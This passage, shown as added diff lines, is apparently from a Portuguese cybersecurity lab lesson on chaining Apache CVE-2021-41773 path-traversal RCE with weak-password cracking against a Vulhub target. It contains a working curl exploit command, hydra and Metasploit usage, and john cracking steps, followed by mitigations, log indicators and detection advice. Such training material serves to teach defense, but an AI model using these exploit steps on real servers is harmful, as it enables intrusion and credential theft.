+    -d 'echo Content-Type: text/plain; echo; sha256sum /bin/sh' \
+    'http://vulhub/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'
+350b2973dd4a...  /bin/sh
+```
+O usuário é `daemon` (via A) e o hash começa em `350b2973dd4a`. Juntos, no formato `FLAG{usuario-hash}`, são a prova do comprometimento ponta a ponta.
+</Solution>
+
+<FlagInput task="comprometimento-ponta-a-ponta" />
+
+### 5.7 Desligar o laboratório
+
+No painel do lab, clique em **Parar** (libera a vaga do "um lab por vez"). Use **Resetar** se quiser refazer o exercício do zero — o alvo volta ao estado inicial.
+
+## 6. Variações e aprofundamento
+
+**Sem foothold? Ataque a via B online.** Se a CVE não existisse, você ainda teria a senha fraca — mas sem o `.htpasswd` em mãos, o jeito é atacar **online**: `hydra -L usuarios.txt -P lista.txt vulhub http-get /admin/` testa combinações contra o Basic Auth, uma requisição por palpite. É o password spraying de 5.5. Compare com o que fez aqui: online é lento, barulhento (cada palpite vira um `401` no log do servidor) e morre se houver bloqueio de conta; a quebra offline, com o hash saqueado, roda milhões de palpites por segundo sem tocar o alvo. É por isso que o foothold que entrega o arquivo de hashes vale tanto.
+
+**O mesmo ataque, empacotado: Metasploit.** Tudo que você fez "na unha" com `curl` o Metasploit (5.3) automatiza. O módulo `exploit/multi/http/apache_normalize_path_rce` reproduz a CVE-2021-41773: `use` nele, `set RHOSTS vulhub`, `set TARGETURI /cgi-bin/`, `run`, e você ganha uma session. Vale fazer das duas formas: o `curl` te mostra cada byte do ataque; o Metasploit mostra como um profissional ganha velocidade sem perder o entendimento.
+
+**Se o alvo estivesse mais bem configurado.** Imagine as defesas ligadas, uma de cada vez: com o CGI desligado, a mesma travessia só **leria** arquivos (a CVSS cai de 9.8 para 7.5) — você ainda saquearia o `.htpasswd`, mas sem RCE. Com senha forte no `/admin`, a quebra offline falharia e a via B morreria. Com o patch da 2.4.51, a via A inteira sumiria. Testar essas hipóteses no lab (editando a config e subindo de novo) é o melhor jeito de sentir, na pele, o que cada camada de defesa compra.
+
+**O passo seguinte: pivoting.** No nosso lab há um alvo só, então o attack path termina no foothold. Num ambiente real, o foothold raramente é o objetivo — é o trampolim. A partir dele, o atacante enumera a **rede interna** que só aquele host enxerga e faz <GlossaryTerm term="lateral movement">lateral movement</GlossaryTerm> (movimento lateral) para outras máquinas, usando o host comprometido como ponto de pivô. Esse é o tema da Trilha 6 e das máquinas estilo CTF da Trilha 8.
+
+## 7. Erros comuns
+
+- **`404` na travessia:** você esqueceu o `--path-as-is`. Sem ele, o `curl` normaliza o caminho no cliente e desarma o ataque antes de sair. O bug está no servidor; o payload tem de chegar cru.
+- **`500` em vez da saída do comando:** você apontou a travessia para um arquivo que não é executável (ex.: `/etc/passwd`) sob o `/cgi-bin/`. Ali tudo é tratado como script; aponte para `/bin/sh` e mande o comando no corpo.
+- **john diz "No password hashes loaded":** confira o `--format`. Hashes `$apr1$` são `md5crypt-long`. Se você colou só o hash sem o `usuario:`, alguns formatos reclamam — mantenha o arquivo no formato `usuario:$apr1$...`.
+- **"rockyou não existe":** neste lab, a lista embutida do john (`/usr/share/john/password.lst`) já quebra as senhas deliberadamente fracas do alvo — não precisa de rockyou. Em 5.5 você viu quando cada lista faz sentido.
+- **Confundir as duas vias:** o `.htpasswd` (via B) não tem nada a ver com o `/etc/passwd` do sistema (via A). O primeiro é o arquivo de senhas **do Apache** para o `/admin`; o segundo é a lista de contas **do Linux**. Lugares, formatos e propósitos diferentes.
+- **Atacar sem anotar:** você chega na flag, fecha o terminal e perde o attack path. Anote enquanto faz. O comando que você não registrou é um achado que você não consegue provar.
+
+## 8. Defesa e mitigação
+
+A lição de defesa do mini-projeto é a mais importante da trilha: **o atacante precisa que todos os elos falhem; o defensor só precisa cortar um**. Vamos pelas camadas, e em cada uma diga-se exatamente o que fazer.
+
+<Figure
+  src={defesaEmProfundidade}
+  alt="Uma coluna lista os cinco elos da cadeia, de cima para baixo, ligados por uma linha vertical: versão 2.4.49 vulnerável; CGI ligado e diretório raiz liberado; banner e /internal vazando; senha fraca no /admin; e ação sem detecção. À direita de cada elo, uma caixa verde com a defesa que o corta — atualizar para a 2.4.51; desligar o CGI e negar o acesso à raiz; ServerTokens Prod e remover o /internal; senha forte com bloqueio de conta e MFA; registrar e alertar no padrão de traversal. Cada defesa tem uma linha pontilhada verde indicando que, sozinha, corta a cadeia. A legenda reforça: o atacante precisa de todos os elos, o defensor de apenas um."
+  caption="Defesa em profundidade: cinco camadas, cada uma suficiente, sozinha, para quebrar a cadeia. É por isso que vale ter várias mesmo que nenhuma seja perfeita."
+/>
+
+**1. Corrija a versão (corta a via A na raiz).** Atualize o Apache para a **2.4.51** ou mais recente. Não pare na 2.4.50: ela corrigiu de forma incompleta (a dupla codificação ainda passava, a CVE-2021-42013). Confira a versão exata que fecha a falha, não "a mais nova que eu tinha". Gerenciamento de patch é a defesa número um contra n-days.
+
+**2. Reduza a superfície (mata o RCE mesmo numa versão furada).** A travessia só vira RCE porque duas configurações erradas estão ligadas. Desligue o CGI se não precisar dele, e **nunca** libere o acesso à raiz do servidor:
+
+```text
+# Ruim (o que torna o lab explorável):
+LoadModule cgid_module modules/mod_cgid.so
+<Directory />
+    Require all granted
+</Directory>
+
+# Seguro (padrão do Apache):
+<Directory />
+    Require all denied
+</Directory>
+# e não carregue o mod_cgid/mod_cgi se a aplicação não usa CGI.
+```
+
+Com o CGI desligado, a mesma travessia no máximo **lê** arquivos (impacto 7.5), e com a raiz negada ela nem isso.
+
+**3. Pare de entregar pistas (dificulta o recon).** Troque `ServerTokens Full` por `ServerTokens Prod` (o banner vira só `Apache`, sem a versão), remova cabeçalhos que vazam caminhos internos como o `X-Backend-Config`, e desligue o directory listing (`Options -Indexes`) — o `/internal` não deveria estar listável, nem existir em produção. Isso não impede o ataque sozinho, mas tira o mapa da mão do atacante.
+
+**4. Credenciais que resistem (mata a via B).** Senha fraca e reusada foi o que abriu o `/admin`. As defesas: exigir **senhas fortes** (longas, não dicionário — `superman` e `password1` cairiam em qualquer lista), proibir o **reúso** entre contas, aplicar **bloqueio de conta** (<GlossaryTerm term="account lockout">account lockout</GlossaryTerm>) e <GlossaryTerm term="rate limiting">rate limiting</GlossaryTerm> contra o ataque online, e — o mais forte — **autenticação multifator** (<GlossaryTerm term="multi-factor authentication">MFA</GlossaryTerm>): mesmo com a senha quebrada, sem o segundo fator o atacante não entra. E nunca guarde o arquivo de hashes num lugar que um foothold de serviço consiga ler.
+
+**5. Veja o ataque acontecer (reduz o tempo de permanência).** A Equifax ficou 76 dias cega. Não repita. O rastro do nosso ataque está no log de acesso do Apache, e é berrante:
+
+```text
+192.168.0.10 - - [.../Oct/...] "POST /cgi-bin/.%2E/%2E%2E/%2E%2E/%2E%2E/bin/sh HTTP/1.1" 200 136
+192.168.0.10 - admin [.../Oct/...] "GET /admin/ HTTP/1.1" 200 98
+[auth_basic:error] ... AH01617: user admin: authentication failure for "/admin/": Password Mismatch
+```
+
+Um `POST` para um caminho com `%2E` e `bin/sh` é um <GlossaryTerm term="indicator of compromise">indicador de comprometimento</GlossaryTerm> inequívoco — nenhuma requisição legítima se parece com isso. Uma regra de WAF ou de SIEM que alerte sobre `cgi-bin` + travessia codificada, somada ao monitoramento de falhas de autenticação repetidas (`AH01617`), teria pegado as duas vias em minutos, não em meses.
+
+## 9. Exercícios
+
+As duas flags da seção 5 são as tarefas práticas do módulo: o **checkpoint** (o reúso de credenciais que liga as vias) e o **objetivo** (o acesso confirmado com a evidência). Se ainda não enviou, volte e feche as duas. Em seguida, o quiz amarra a teoria do encadeamento, da defesa em profundidade e da evidência.
+
+<Quiz task="quiz-final" />
+
+## 10. Resumo e glossário
+
+**Pontos-chave:**
+
+- Um comprometimento real é uma **cadeia**: recon → enumeração → acesso inicial → pós-exploração, com cada fase alimentando a próxima.
+- O **encadeamento** multiplica o impacto: aqui, o RCE da CVE (via A) entregou as credenciais da senha fraca (via B). A saída de uma falha foi a entrada da outra.
+- O **foothold** veio como `daemon`, de baixo privilégio — um começo, não o fim. Virar root seria escalação de privilégio (Trilha 6); pivotar seria o passo para a rede interna.
+- **Defesa em profundidade**: o atacante precisa de todos os elos; o defensor corta um. Patch (2.4.51), CGI desligado, senha forte com MFA ou só a detecção — qualquer um teria quebrado a cadeia.
+- O produto do teste é a **evidência**: anote comando, horário e resposta enquanto ataca. A flag final é, ela mesma, uma peça de prova.
+- O caso Equifax (GAO-18-559) é a mesma cadeia em escala catastrófica: CVE conhecida não corrigida → foothold → saque de credenciais em claro → acesso a mais sistemas, 76 dias sem detecção.
+
+### Termos deste módulo
+
+<ModuleGlossary />
+
+### Para ir além
+
+- [GAO-18-559 — relatório do Congresso americano sobre a invasão da Equifax](https://www.gao.gov/products/gao-18-559) — a reconstrução oficial, passo a passo, de uma cadeia idêntica à deste módulo.
+- [CISA KEV — Known Exploited Vulnerabilities Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) — o catálogo do que está sendo explorado na prática; confira a CVE-2021-41773 lá.
+- [MITRE ATT&CK](https://attack.mitre.org/) — o dicionário de táticas e técnicas para nomear cada passo do seu attack path no relatório.
